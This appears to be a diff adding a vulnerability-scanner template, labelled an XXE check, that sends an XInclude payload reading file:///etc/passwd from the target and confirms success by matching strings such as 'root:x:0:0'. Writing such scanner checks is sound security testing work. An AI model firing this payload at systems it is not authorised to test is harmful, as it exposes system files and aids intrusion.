@@ -1,0 +1,23 @@
+id: xxe2-004
+name: 'XXE file read in payload'
+severity: critical
+type: active
+tags:
+  - xxe
+  - injection
+  - xml
+description: 'XXE entity via payload'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      payload:
+        - '<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></r>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
+          - 'XXE_OK'
+          - 'localhost'
+          - 'uid='
